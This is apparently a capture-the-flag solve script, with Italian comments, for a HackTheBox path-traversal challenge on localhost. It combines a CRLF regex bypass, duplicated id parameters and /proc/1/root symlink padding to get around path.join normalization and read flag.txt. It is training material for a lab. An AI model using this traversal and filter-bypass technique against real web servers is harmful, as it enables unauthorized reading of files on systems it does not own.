#fuzzing dei caratteri speciali di path travsersal (control char) https://en.wikipedia.org/wiki/Control_character
# 0x00 	NUL 	DLE
# 0x01 	SOH 	DC1
# 0x02 	STX 	DC2
# 0x03 	ETX 	DC3
# 0x04 	EOT 	DC4
# 0x05 	ENQ 	NAK
# 0x06 	ACK 	SYN
# 0x07 	BEL 	ETB
# 0x08 	BS 	    CAN
# 0x09 	HT 	    EM
# 0x0A 	LF 	    SUB
# 0x0B 	VT 	    ESC
# 0x0C 	FF 	    FS
# 0x0D 	CR 	    GS
# 0x0E 	SO 	    RS
# 0x0F 	SI 	    US
# 0x7F 	DEL
#cercare regex bypass (https://github.com/attackercan/regexp-security-cheatsheet)
#in effetti con %0a si riesce a bypassare la regex ma resta il controllo sulla presenza del .. o / quindi bisogna bypassare quello e lo si fa con parameter pollution cioè inserendo 2 volte il parametro ID

#bisogna inoltre tenere in conto il funzionamento del metodo path.join() il quale fa un resolve dell'input per 'ottimizzarlo' e tagliando alcuni path superflui
#perciò bisogna trovare un modo di creare un path che vada in profondità senza mai 'tornare indietro'
#esistono solitamente dei sym link a / in linux, come ad esempio /proc/*/root, che è possibile cercare da dentro il docker ocn il
#  comando: find / -type l -lname / 2> /dev/null

#esiste quasi sicuramente il path /proc/1/root che ha una lunghezza totale di 11 char che spezza la 'monotonia' dei 2 char ../ cosi che con la giusta concatenazione si può arrivare a 100c
# tenere a mente che il primo pezzo del path team/../ viene risolto con . cioè si annulla tutto perciò bisogna contare 3 char in più da aggiungere (dato che il primo  ../ si annulla)

#poichè 95 (106 - len(/flag.txt)) non è divisibile per 3 non è possibile riempiere tutto il path con stringhe ../ ma bisogna trovare una stringa di lunghezza non divisibile per 3 che spezzi la catena in modo da raggiungere 95 di lunghezza (quale ad esempio /proc/1/root che è lunga 11)
import requests

challenge_ip = 'http://localhost:1337/'

def genera_stringa(base_str, padding_str, totale_len=95):
    c = 1  # Iniziamo con almeno una stringa di lunghezza 13
    result = ""  # Stringa che costruiremo
    
    while True:
        # Calcoliamo la lunghezza residua
        remaining_length = totale_len - c * len(padding_str)
        
        # Se la lunghezza rimanente è divisibile per 3, possiamo riempirla con "../"
        if remaining_length % len(base_str) == 0:
            # Costruisci la stringa con c stringhe di lunghezza 13 e il resto con stringhe di lunghezza 3
            result = base_str * (remaining_length // 3) + padding_str * c
            break
        else:
            # Se non è divisibile per 3, incrementiamo c per provare a inserire più stringhe di lunghezza 13
            c += 1
    
    return result


# Generiamo la stringa di lunghezza 97
stringa = genera_stringa('../', 'proc/11/root/') + 'flag.txt'

payload = 'api/team?id=' + stringa + '&id=3&id=%0d%0a3'
flag = requests.get(challenge_ip + payload).text

if 'HTB{' in flag:
    print(f"Congratulations, here's your flag: {flag}")
else:
    print('Oh oh, something went wrong!')
    print(flag)